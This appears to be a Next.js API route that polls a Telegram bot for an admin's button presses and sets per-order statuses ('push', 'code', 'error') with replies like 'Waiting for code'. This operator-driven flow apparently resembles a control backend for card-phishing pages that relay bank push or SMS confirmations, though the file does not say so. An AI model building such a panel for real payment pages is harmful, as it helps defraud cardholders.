import { NextRequest, NextResponse } from 'next/server';
import { setOrderStatus } from '@/lib/order-status';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || '';

// Endpoint для polling обновлений от Telegram (если webhook не настроен)
// Вызывается периодически с клиента для проверки нажатий кнопок
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const offset = searchParams.get('offset') || '0';
    
    // Получаем обновления от Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=1`;
    
    const response = await fetch(telegramUrl, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
      },
    });

    const data = await response.json();

    if (!response.ok || !data.ok) {
      console.error('Telegram getUpdates error:', data);
      return NextResponse.json({ ok: false, updates: [] });
    }

    const updates = data.result || [];
    let lastUpdateId = parseInt(offset);
    const processedCallbacks: Array<{ orderId: string; status: string }> = [];

    // Обрабатываем каждое обновление
    for (const update of updates) {
      if (update.update_id > lastUpdateId) {
        lastUpdateId = update.update_id;
      }

      // Обрабатываем callback_query
      if (update.callback_query) {
        const callbackQuery = update.callback_query;
        const { data: callbackData, from } = callbackQuery;

        // Проверяем, что запрос от админа
        if (from.id.toString() !== TELEGRAM_ADMIN_ID) {
          console.log('Callback from non-admin user:', from.id);
          continue;
        }

        // Парсим callback_data
        const underscoreIndex = callbackData.indexOf('_');
        if (underscoreIndex === -1) {
          console.error('Invalid callback data format:', callbackData);
          continue;
        }

        const action = callbackData.substring(0, underscoreIndex);
        const orderId = callbackData.substring(underscoreIndex + 1);

        console.log('Processing callback from polling:', { action, orderId, callbackData });

        if (!orderId || !action) {
          console.error('Invalid callback data:', { action, orderId, callbackData });
          continue;
        }

        // Обновляем статус заказа
        const statusMap: Record<string, 'push' | 'code' | 'error'> = {
          'push': 'push',
          'code': 'code',
          'error': 'error'
        };

        const status = statusMap[action];
        if (status && orderId) {
          console.log(`[Polling] Setting status: ${orderId} -> ${status}`);
          setOrderStatus(orderId, status);
          
          // Проверяем, что статус действительно обновился
          const { getOrderStatus } = await import('@/lib/order-status');
          const verifyStatus = getOrderStatus(orderId);
          console.log(`[Polling] ✅ Verified status for ${orderId}: ${verifyStatus}`);
          
          if (verifyStatus === status) {
            processedCallbacks.push({ orderId, status });
          } else {
            console.error(`[Polling] ❌ Status mismatch! Expected ${status}, got ${verifyStatus}`);
          }
        }

        // Отвечаем на callback
        const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
        await fetch(answerUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: callbackQuery.id,
            text: action === 'push' ? 'Push отправлен' : action === 'code' ? 'Ожидание кода' : 'Ошибка обработана',
          }),
        });
      }
    }

    return NextResponse.json({
      ok: true,
      lastUpdateId: lastUpdateId + 1,
      processedCallbacks,
      updateCount: updates.length
    });
  } catch (error) {
    console.error('Telegram poll error:', error);
    return NextResponse.json({ ok: false, error: 'Internal error' }, { status: 500 });
  }
}
